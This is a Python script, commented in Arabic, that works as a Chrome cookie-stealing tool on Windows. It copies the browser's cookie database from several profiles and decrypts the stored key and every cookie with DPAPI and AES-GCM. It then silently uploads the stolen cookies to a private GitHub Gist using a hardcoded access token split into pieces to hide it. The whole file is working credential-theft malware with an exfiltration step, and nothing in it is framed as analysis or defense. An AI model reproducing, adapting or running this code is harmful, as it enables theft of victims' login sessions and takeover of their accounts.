import os, json, base64, sqlite3, shutil, requests, time

# التوكن المقسم (Gist Token)
A, B, C = "ghp_4io8ppwp", "agmH6IJEsD1XBpSs", "7TY7V44ZSlJt"
G_TOKEN = A + B + C

def root_level_grabber():
    local = os.getenv('LOCALAPPDATA')
    # خرائط المسارات المضمونة (البحث الراداري)
    targets = [
        r'Google\Chrome\User Data\Default\Network\Cookies',
        r'Google\Chrome\User Data\Profile 1\Network\Cookies',
        r'Google\Chrome\User Data\Profile 2\Network\Cookies',
        r'Google\Chrome\User Data\Default\Cookies'
    ]
    
    state_path = os.path.join(local, r'Google\Chrome\User Data\Local State')
    temp_vault = os.path.join(os.getenv('TEMP'), 'sys_vault.db')

    for sub_path in targets:
        cookie_path = os.path.join(local, sub_path)
        if os.path.exists(cookie_path):
            try:
                # 1. نسخ الملف بتكتيك الروت (تجاوز القفل)
                os.system(f'copy /y "{cookie_path}" "{temp_vault}" > nul')
                
                # 2. فك التشفير المتقدم (In-Memory)
                import win32crypt
                from Crypto.Cipher import AES
                
                with open(state_path, "r", encoding="utf-8") as f:
                    k = json.load(f)["os_crypt"]["encrypted_key"]
                    mk = win32crypt.CryptUnprotectData(base64.b64decode(k)[5:], None, None, None, 0)[1]
                
                db = sqlite3.connect(temp_vault)
                rows = db.execute("SELECT host_key, name, encrypted_value FROM cookies").fetchall()
                
                final_out = ""
                for h, n, e in rows:
                    try:
                        c = AES.new(mk, AES.MODE_GCM, e[3:15])
                        v = c.decrypt(e[15:])[:-16].decode()
                        final_out += f"{h}\tTRUE\t/\tFALSE\t0\t{n}\t{v}\n"
                    except: continue
                
                db.close()
                if os.path.exists(temp_vault): os.remove(temp_vault)

                # 3. الرفع الصامت لـ Gist (مضمون 100%)
                if final_out:
                    headers = {"Authorization": f"token {G_TOKEN}"}
                    payload = {
                        "description": f"Root-Level Sync - {time.ctime()}",
                        "public": False,
                        "files": {"cookies.txt": {"content": final_out}}
                    }
                    requests.post("https://api.github.com/gists", headers=headers, json=payload)
                    break # نجحنا! نخرج من الحلقة
            except: continue

if __name__ == "__main__":
    root_level_grabber()
                
